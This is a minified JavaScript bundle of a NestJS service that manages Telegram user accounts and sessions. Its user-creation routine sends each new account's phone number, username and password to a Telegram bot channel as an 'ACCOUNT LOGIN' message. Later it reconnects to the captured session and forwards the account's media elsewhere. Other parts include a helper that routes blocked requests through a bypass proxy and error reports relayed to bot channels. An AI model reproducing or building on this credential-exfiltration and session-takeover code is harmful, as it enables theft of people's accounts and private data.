u=class{};t.UsersModule=u,t.UsersModule=u=n([(0,o.Module)({imports:[d.initModule,r.MongooseModule.forFeature([{name:"userModule",schema:c.UserSchema,collection:"users"}]),(0,o.forwardRef)((()=>l.TelegramModule)),(0,o.forwardRef)((()=>p.ClientModule))],controllers:[s.UsersController],providers:[a.UsersService],exports:[a.UsersService]})],u)},9127:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersService=void 0;const a=i(2995),s=i(3563),c=i(5839),l=i(6037),p=i(5562),d=i(9647),u=i(6250),m=i(3653);let g=class{constructor(e,t,i){this.userModel=e,this.telegramService=t,this.clientsService=i}async create(e){const t=this.telegramService.getActiveClientSetup();if(console.log("New User received - ",e?.mobile),console.log("ActiveClientSetup::",t),!t||t.newMobile!==e.mobile)return await(0,d.fetchWithTimeout)(`${(0,u.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${e.username?`@${e.username}`:e.firstName}\nMobile: t.me/${e.mobile}${e.password?`\npassword: ${e.password}`:"\n"}`)}`),setTimeout((async()=>{await m.connectionManager.getClient(e.mobile,{autoDisconnect:!1,handler:!1}),this.telegramService.forwardMedia(e.mobile,"savedmessages37",null)}),3e6),new this.userModel(e).save();console.log("Updating New Session Details",e.mobile,e.username,t.clientId),await this.clientsService.updateClientSession(e.session)}async findAll(){return this.userModel.find().exec()}async findOne(e){const t=await((await this.userModel.findOne({tgId:e}).exec())?.toJSON());if(!t)throw new s.NotFoundException(`User with tgId ${e} not found`);return t}async update(e,t){delete t._id;const i=await this.userModel.updateMany({tgId:e},{$set:t},{new:!0,upsert:!0}).exec();if(0===i.matchedCount)throw new s.NotFoundException(`Users with tgId ${e} not found`);return i.modifiedCount}async updateByFilter(e,t){delete t._id;const i=await this.userModel.updateMany(e,{$set:t},{new:!0,upsert:!0}).exec();if(0===i.matchedCount)throw new s.NotFoundException(`Users with tgId ${JSON.stringify(e)} not found`);return i.modifiedCount}async delete(e){if(0===(await this.userModel.deleteOne({tgId:e}).exec()).deletedCount)throw new s.NotFoundException(`User with tgId ${e} not found`)}async search(e){return e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),void 0!==e.twoFA&&(e.twoFA="true"===e.twoFA||"1"===e.twoFA||!0===e.twoFA),console.log(e),this.userModel.find(e).sort({updatedAt:-1}).exec()}async executeQuery(e,t,i,n){try{if(!e)throw new s.BadRequestException("Query is invalid.");const o=this.userModel.find(e);return t&&o.sort(t),i&&o.limit(i),n&&o.skip(n),await o.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}};t.UsersService=g,t.UsersService=g=n([(0,s.Injectable)(),r(0,(0,c.InjectModel)("userModule")),r(1,(0,s.Inject)((0,s.forwardRef)((()=>a.TelegramService)))),r(2,(0,s.Inject)((0,s.forwardRef)((()=>p.ClientService)))),o("design:paramtypes",[l.Model,a.TelegramService,p.ClientService])],g)},3538:(e,t)=>{var i;Object.defineProperty(t,"__esModule",{value:!0}),t.PrivacyLevelEnum=void 0,function(e){e.everybody="everybody",e.contacts="contacts",e.nobody="nobody"}(i||(t.PrivacyLevelEnum=i={}))},7927:function(e,t,i){var n=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0});const o=i(8781),r=n(i(6037)),a=i(3205),s=i(9742),c=i(3563);!async function(){const e=await o.NestFactory.create(a.AppModule),t=(new s.DocumentBuilder).setTitle("NestJS and Express API").setDescription("API documentation").setVersion("1.0").build();e.use(((e,t,i)=>{t.header("Access-Control-Allow-Origin","*"),t.header("Access-Control-Allow-Methods","GET,PUT,POST,DELETE"),t.header("Access-Control-Allow-Headers","Content-Type, Accept"),i()})),e.enableCors({allowedHeaders:"*",origin:"*"});const i=s.SwaggerModule.createDocument(e,t);s.SwaggerModule.setup("api",e,i),r.default.set("debug",!0),e.useGlobalPipes(new c.ValidationPipe({transform:!0,transformOptions:{enableImplicitConversion:!0}})),process.on("unhandledRejection",((e,t)=>{console.error("Unhandled Rejection at:",t,"reason:",e)})),process.on("uncaughtException",((e,t)=>{console.error(t,e)}));let n=!1;const l=async t=>{n||(n=!0,console.log(`${t} received`),await e.close(),process.exit(0))};process.on("exit",(async()=>{console.log("Application closed")})),process.on("SIGINT",(async()=>{await l("SIGINT")})),process.on("SIGTERM",(async()=>{await l("SIGTERM")})),process.on("SIGQUIT",(async()=>{await l("SIGQUIT")})),await e.init(),await e.listen(process.env.PORT||9e3),console.log(`Application is running on: ${await e.getUrl()}`)}()},3924:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.LoggerMiddleware=void 0;const o=i(3563),r=i(9647),a=i(3235),s=i(6250);let c=class{constructor(){this.logger=new o.Logger("HTTP")}use(e,t,i){const{method:n,originalUrl:o,baseUrl:c}=e;var l;e.get("user-agent"),e.ip,l=o,["/sendtochannel","/favicon.","/tgsignup"].some((e=>l.startsWith(e)))||"/"===o?o.includes("Video")&&this.logger.log(`Excluded endpoint hit: ${o} (length: ${o.length})`):(t.on("finish",(()=>{const{statusCode:i}=t;t.get("content-length"),i>=500?((0,r.fetchWithTimeout)(`${(0,s.notifbot)()}&text=${encodeURIComponent(`Failed :: ${o} with ${i}`)}`),this.logger.error(`${n} ${o} ${e.ip} || StatusCode : ${i}`)):i>=400?((0,r.fetchWithTimeout)(`${(0,s.notifbot)()}&text=${encodeURIComponent(`Failed :: ${o} with ${i}`)}`),this.logger.warn(`${n} ${o} ${e.ip} || StatusCode : ${i}`)):i>=300?this.logger.verbose(`${n} ${o} ${e.ip} || StatusCode : ${i}`):this.logger.log(`${n} ${o} ${e.ip} || StatusCode : ${i}`)})),t.on("error",(e=>{const t=(0,a.parseError)(e,process.env.clientId);(0,r.fetchWithTimeout)(`${(0,s.notifbot)()}&text=${encodeURIComponent(`Failed :: ${o} with ${t.message}`)}`)}))),i()}};t.LoggerMiddleware=c,t.LoggerMiddleware=c=n([(0,o.Injectable)()],c)},6185:(e,t)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.mapToJson=t.areJsonsNotSame=t.defaultMessages=t.defaultReactions=t.fetchNumbersFromString=t.toBoolean=t.contains=t.sleep=void 0,t.sleep=function(e){return new Promise((t=>setTimeout(t,e)))},t.contains=function(e,t){return!(!e||!Array.isArray(t))&&t.some((t=>t&&e.includes(t)))},t.toBoolean=function(e){if(null==e)return!1;if("string"==typeof e){const t=e.toLowerCase().trim();return"true"===t||"1"===t||"yes"===t}return"number"==typeof e?0!==e:e},t.fetchNumbersFromString=function(e){if(!e)return"";const t=e.match(/\d+/g);return t?t.join(""):""},t.defaultReactions=Object.freeze(["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"]),t.defaultMessages=Object.freeze(["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21"]),t.areJsonsNotSame=function(e,t){const i=["id","_id"];function n(e){if(null==e)return e;if("object"!=typeof e)return e;if(Array.isArray(e))return e.map(n);const t={},o=Object.keys(e).filter((e=>!i.includes(e))).sort();for(const i of o)t[i]=n(e[i]);return t}console.log("[areJsonsNotSame] Starting comparison...");const o=n(e),r=n(t),a=JSON.stringify(o)!==JSON.stringify(r);return console.log("[areJsonsNotSame] Comparison result: "+(a?"Objects are different":"Objects are same")),a},t.mapToJson=function(e){if(!(e instanceof Map))throw new Error("Input must be a Map instance");const t={};for(const[i,n]of e.entries())t[String(i)]=n;return t}},9647:function(e,t,i){var n=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.fetchWithTimeout=void 0;const o=n(i(8938)),r=i(7385),a=i(3235),s=i(6250),c=n(i(8611)),l=n(i(2057));async function p(e,t){if(!t.bypassUrl&&!process.env.bypassURL)throw console.error("Bypass URL is not provided"),new Error("Bypass URL is not provided");t.bypassUrl=t.bypassUrl||`${process.env.bypassURL}/execute-request`;const i=o.default.create({responseType:t.responseType||"json",maxContentLength:1/0,maxBodyLength:1/0,timeout:t.timeout||3e4,httpAgent:new c.default.Agent({keepAlive:!0}),httpsAgent:new l.default.Agent({keepAlive:!0})}),n=await i.post(t.bypassUrl,{url:e,method:t.method,headers:t.headers,data:t.data,params:t.params,responseType:t.responseType,timeout:t.timeout,followRedirects:0!==t.maxRedirects,maxRedirects:t.maxRedirects},{headers:{"Content-Type":"application/json",...t.headers}});return("arraybuffer"===t.responseType||n.headers["content-type"]?.includes("application/octet-stream")||n.headers["content-type"]?.includes("image/")||n.headers["content-type"]?.includes("audio/")||n.headers["content-type"]?.includes("video/")||n.headers["content-type"]?.includes("application/pdf"))&&(n.data=Buffer.from(n.data)),n}function d(e,t){if(o.default.isAxiosError(e)){const t=["ETIMEDOUT","ECONNABORTED","ECONNREFUSED","ECONNRESET","ERR_NETWORK","ERR_BAD_RESPONSE","EHOSTUNREACH","ENETUNREACH"];if(e.code&&t.includes(e.code))return!0;if(e.message?.toLowerCase().includes("timeout"))return!0}return m(t.status)}function u(e,t){const i="string"==typeof t.message?t.message:JSON.stringify(t.message);if(console.error(`${e}\n${i.includes("ETIMEDOUT")?"Connection timed out":i.includes("ECONNREFUSED")?"Connection refused":(0,a.extractMessage)(t?.message)}`),429===t.status)return;const n=`${e}\n\n${i.includes("ETIMEDOUT")?"Connection timed out":i.includes("ECONNREFUSED")?"Connection refused":(0,a.extractMessage)(t?.message)}`;try{o.default.get(`${(0,s.ppplbot)(process.env.httpFailuresChannel)}&text=${encodeURIComponent(n)}`)}catch(e){console.error("Failed to notify failure:",e)}}function m(e){return[408,500,502,503,504,429].includes(e)}function g(e){const t=Math.min(500*Math.pow(2,e),3e4),i=Math.random()*(.2*t);return Math.floor(t+i)}t.fetchWithTimeout=async function(e,t={},i=3){if(!e)return void console.error("URL is empty");t.timeout=t.timeout||3e4,t.method=t.method||"GET";let n=null;console.log(`Trying: ${e}`);const s=new URL(e),h=s.host,y=s.pathname+s.search;for(let s=0;s<=i;s++){const f=new AbortController,v=t.timeout+5e3*s,b=setTimeout((()=>f.abort()),v);try{const i=await(0,o.default)({...t,url:e,signal:f.signal,httpAgent:new c.default.Agent({keepAlive:!0,timeout:v}),httpsAgent:new l.default.Agent({keepAlive:!0,timeout:v}),maxRedirects:5});return clearTimeout(b),i}catch(c){clearTimeout(b),n=c;const l=(0,a.parseError)(c,`host: ${h}\nendpoint:${y}`,!1),f=(0,a.extractMessage)(l);if(o.default.isAxiosError(c)&&("ECONNABORTED"===c.code||c.message.includes("timeout")||408===l.status)?(console.error(`Request timeout (${t.timeout}ms): ${e}`),u(`Timeout on attempt ${s}`,{message:`${process.env.clientId} host=${h}\nendpoint=${y}\ntimeout=${t.timeout}ms`,status:408})):u(`Attempt ${s} failed`,{message:`${process.env.clientId} host=${h}\nendpoint=${y}\n${f.length<250?`msg: ${f}`:"msg: Message too long"}`,status:l.status}),403===l.status){u("Attempting bypass for",{message:`${process.env.clientId}  host=${h}\nendpoint=${y}`});try{const i=await p(e,t);return u("Successfully executed 403 request",{message:`${process.env.clientId} host=${h}\nendpoint=${y}`}),i}catch(e){const t=(0,a.extractMessage)((0,a.parseError)(e,`host: ${h}\nendpoint:${y}`,!1));return void u("Bypass attempt failed",{message:`host=${h}\nendpoint=${y}\n${t.length<250?`msg: ${t}`:"msg: Message too long"}`})}}if(s<i&&(d(c,l)||m(l.status))){const e=g(s);console.log(`Retrying request (${s+1}/${i}) after ${e}ms`),await(0,r.sleep)(e);continue}return}}const f=(0,a.extractMessage)((0,a.parseError)(n,`${process.env.clientId} host: ${h}\nendpoint:${y}`,!1));u(`All ${i} retries exhausted`,{message:f.length<250?`msg: ${f}`:"msg: Message too long"})}},6250:(e,t)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.ppplbot=t.notifbot=t.getBotToken=void 0;let i=null,n=0;const o=()=>(null===i&&(i=(()=>{const e=(process.env.BOT_TOKENS||"").split(",").filter(Boolean);if(0===e.length)throw new Error("No bot tokens configured. Please set BOT_TOKENS environment variable");return e})()),i);t.getBotToken=function(){return o()[n]},t.notifbot=function(e=process.env.accountsChannel||"-1001801844217",t){const i=o(),r=`https://api.telegram.org/bot${t||i[n]}/sendMessage?chat_id=${e}`;return t||(n=(n+1)%i.length),r},t.ppplbot=function(e=process.env.updatesChannel||"-1001972065816",t){const i=o(),r=`https://api.telegram.org/bot${t||i[n]}/sendMessage?chat_id=${e}`;return t||(n=(n+1)%i.length),r}},3235:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.parseError=t.extractMessage=void 0;const n=i(9647),o=i(6250);t.extractMessage=e=>{if(Array.isArray(e))return`${e.map((e=>(0,t.extractMessage)(e))).join("\n")}`;if("string"==typeof e||"number"==typeof e||"boolean"==typeof e)return String(e);if("object"==typeof e&&null!==e){const i=[];for(const n in e){const o=e[n],r=n;Array.isArray(o)?i.push(`${r}=${o.map((e=>(0,t.extractMessage)(e))).join("\n")}`):"string"==typeof o||"number"==typeof o||"boolean"==typeof o?i.push(`${r}=${o}`):"object"==typeof o&&null!==o&&i.push(String((0,t.extractMessage)(o)))}return i.length>0?i.join("\n"):""}return""},t.parseError=function(e,i,r=!0){const a=process.env.clientId||"UnknownClient",s=(process.env.notifChannel,`${a} - ${i||""}`);let c=500,l="An unknown error occurred",p="UnknownError";if(e)if(e.response){const t=e.response;c=t.data?.statusCode||t.data?.status||t.data?.ResponseCode||t.status||e.status||500,l=t.data?.message||t.data?.errors||t.data?.ErrorMessage||t.data?.errorMessage||t.data?.UserMessage||t.data||t.message||t.statusText||e.message||"An error occurred",p=t.data?.error||t.error||e.name||e.code||"Error"}else e.request?(c=e.status||408,l=e.data?.message||e.data?.errors||e.data?.ErrorMessage||e.data?.errorMessage||e.data?.UserMessage||e.data||e.message||e.statusText||"The request was triggered but no response was received",p=e.name||e.code||"NoResponseError"):e.message&&(c=e.status||500,l=e.message,p=e.name||e.code||"Error");else l="No error object provided",p="NoErrorObject";const d=`${s} :: ${(0,t.extractMessage)(l)}`,u={status:c,message:e.errorMessage?e.errorMessage:String(d),error:p};if(console.log("ParsedErr: ",{fullMessage:d,...u}),r)try{if(!(d.includes("INPUT_USER_DEACTIVATED")||"429"===c.toString()||d.toLowerCase().includes("too many req")||d.toLowerCase().includes("could not find")||d.includes("ECONNREFUSED"))){const i=`${(0,o.notifbot)()}&text=${s} :: ${e.errorMessage?e.errorMessage:(0,t.extractMessage)(l)}`;(0,n.fetchWithTimeout)(i)}}catch(e){console.error("Failed to send error notification:",e)}return u}},3563:e=>{e.exports=require("@nestjs/common")},3428:e=>{e.exports=require("@nestjs/config")},8781:e=>{e.exports=require("@nestjs/core")},8073:e=>{e.exports=require("@nestjs/mapped-types")},5839:e=>{e.exports=require("@nestjs/mongoose")},9556:e=>{e.exports=require("@nestjs/platform-express")},9742:e=>{e.exports=require("@nestjs/swagger")},4650:e=>{e.exports=require("adm-zip")},8938:e=>{e.exports=require("axios")},2041:e=>{e.exports=require("big-integer")},4922:e=>{e.exports=require("class-transformer")},7403:e=>{e.exports=require("class-validator")},1416:e=>{e.exports=require("cloudinary")},2057:e=>{e.exports=require("https")},2559:e=>{e.exports=require("imap")},6037:e=>{e.exports=require("mongoose")},8461:e=>{e.exports=require("multer")},3047:e=>{e.exports=require("telegram")},7385:e=>{e.exports=require("telegram/Helpers")},9425:e=>{e.exports=require("telegram/Password")},8178:e=>{e.exports=require("telegram/client/uploads")},6969:e=>{e.exports=require("telegram/events")},5651:e=>{e.exports=require("telegram/extensions/Logger")},689:e=>{e.exports=require("telegram/sessions")},3820:e=>{e.exports=require("telegram/tl")},6982:e=>{e.exports=require("crypto")},9896:e=>{e.exports=require("fs")},8611:e=>{e.exports=require("http")},6928:e=>{e.exports=require("path")}},t={},i=function i(n){var o=t[n];if(void 0!==o)return o.exports;var r=t[n]={exports:{}};return e[n].call(r.exports,r,r.exports,i),r.exports}(7927),n=exports;for(var o in i)n[o]=i[o];i.__esModule&&Object.defineProperty(n,"__esModule",{value:!0})})();
//# sourceMappingURL=index.js.map